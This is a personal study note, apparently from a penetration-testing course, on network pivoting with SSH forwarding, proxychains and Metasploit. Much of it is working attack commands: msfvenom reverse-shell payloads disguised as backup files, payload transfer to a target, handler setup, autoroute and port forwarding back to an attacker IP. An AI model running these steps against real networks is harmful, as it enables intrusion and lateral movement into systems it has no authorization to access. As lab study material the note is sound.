
![[Pasted image 20240727141631.png]]

- windows server is in internal network (cannot access using Attack host)
- use ubuntu server to interact with windows server through layer 2(say switch)

# The Networking Behind Pivoting

**Network Interface Card**
- PC can have multiple physical or virtual NICs, each connecting to different networks for simultaneous access.
- use `ifconfig` to find
- `tun0` VPN connection

**DMZ**
- Demilitarized Zone 
- network that hosts an organization's external-facing services and exposes them to the internet
- when compramized machine of DMZ cannot access other internal Netwok

## Routing

- in Pivoting , one computer acts as routers
- routes packets from attack host to target via pivot host
- routing table used for forward traffic to destination
- `netstat -r` or `ip route`


# Dynamic Port Forwarding
idea is to send packets from attack host to target and scan like nmap ping sweep

Port forwarding -> redirect a communication request from one port to another.

![[Pasted image 20240727145934.png]]

- MySQL is running local in Victim machine
- port forward to our attack host
- but how??
- use SSH or SOCKS forward communication from 1234(As out wish) to 3306(MySQL)


```shell-session
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

- verify
```shell-session
netstat -antp | grep 1234
```

```shell-session
nmap -v -sV -p1234 localhost
```

 `local port:server:port` 
 
1234:localhost:3306(Mysql)

- Multiple Forward

```shell-session
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```


## Setting up to Pivot

- `ifconfig`
	-  One connected to our attack host (`ens192`)
	- One communicating to other hosts within a different network (`ens224`)
	- The loopback interface (`lo`).

- scan host of other network ?
- but How??? Do we have route to that network from attack host


![[Pasted image 20240727150935.png]]


- use nmap to scan host of victim internal network 
- packets from nmap transfer from 9050 to victim compromised server to scan internal network through ssh client

- how to transfer packets to 9050 (SOCKS proxy port) ???

- here comes Proxychains

```shell-session
ssh -D 9050 ubuntu@10.129.202.64
```

#### /etc/proxychains.conf


```shell-session
tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

#### Using Nmap with Proxychains

==only perform a `full TCP connect scan` over proxychains.==

 proxychains cannot understand partial packets

#### Using Metasploit with Proxychains

```shell-session
proxychains msfconsole
```



# Remote/Reverse Port Forwarding with SSH

- idea is to get connection from target to attack host machine rev shell

![[Pasted image 20240728002933.png]]

`But what happens if we try to gain a reverse shell?`

- `outgoing connection` for the Windows host is only limited to the `172.16.5.0/23` network.
- find a pivot host, which is a common connection point between attack host and target
- in this case ubuntu is pivot host

![[Pasted image 20240723230547.png]]

- windows server give reverse shell connection to pivot host on port 8080
- from ubuntu server we forward the connection to Attack host (Reverse ssh connection)

#### Creating a Windows Payload with msfvenom

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

- this gives connection to pivot host from windows
- this payload is created in Attach host transfer to pivot host and then to Target windows

#### Configuring & Starting the multi/handler


```shell-session
use exploit/multi/handler
```

```shell-session
set payload windows/x64/meterpreter/reverse_https
```

```shell-session
set lhost 0.0.0.0
```

```shell-session
set lport 8000
```

```shell-session
 run
```

#### Transferring Payload to Pivot Host

```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

#### Starting Python3 Webserver on Pivot Host

```shell-session
python3 -m http.server 8123
```

#### Downloading Payload from Windows Target

```powershell-session
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### Using SSH -R 

- Transfering Reverse shell connnection from Pivot host -> attack host

```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

![[Pasted image 20240728150113.png]]

# Meterpreter Tunneling & Port Forwarding

- idea is if we have meterpreter shell access to ubuntu , how can we effectively use it

### Getting Meterpreter access in Pivot Host

```shell-session
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

#### Configuring & Starting the multi/handler

```shell-session
use exploit/multi/handler
```

```shell-session
set lhost 0.0.0.0
```

```shell-session
set lport 8080
```

```shell-session
set payload linux/x64/meterpreter/reverse_tcp
```

```shell-session
run
```

Copy the msf Payload to Ubuntu Host and Run


#### Ping Sweep

- use to check the live hosts in a Network

```shell-session
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```


every thing done below in Attack Host
#### Configuring MSF's SOCKS Proxy

```shell-session
 use auxiliary/server/socks_proxy
```

```shell-session
set SRVPORT 9050
```

```shell-session
set SRVHOST 0.0.0.0
```

```shell-session
set version 4a
```

```shell-session
run
```

```shell-session
options
```

- comfirming 

```shell-session
jobs
```

#### Adding a Line to proxychains.conf

`/etc/proxychains.conf`

```shell-session
socks4 	127.0.0.1 9050
```

#### Creating Routes with AutoRoute

- tell socks_proxy module to route all the traffic via our Meterpreter session

#### Creating Routes with AutoRoute

```shell-session
use post/multi/manage/autoroute
```

```
sessions -l
```

```shell-session
set SESSION 1
```

```shell-session
set SUBNET 172.16.5.0
```

```shell-session
run
```

Possible to run from Meterpreter session itself

```shell-session
run autoroute -s 172.16.5.0/23
```

#### Listing Active Routes with AutoRoute

```shell-session
run autoroute -p
```


**What Happens Internally:**
- Metasploit adds a routing entry for the `172.16.5.0` subnet.
- Traffic for this subnet is now directed through the compromised host (via the Meterpreter session).


## Port Forwarding

- redirect traffic from Attack host to target via meterpreter session
- enable listener port on our machine and forward all packets recieved in this machine to meterpreter session

```shell-session
 help portfwd
```


```shell-session
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

- packets sent on 3300 from attack machine is forwarded to `172.16.5.19:3300`

- Example
```shell-session
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```


## Meterpreter Reverse Port Forwarding
\
- listen on a specific port on the compromised server
- forward all incoming shells from the Ubuntu server to our attack host


```shell-session
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```



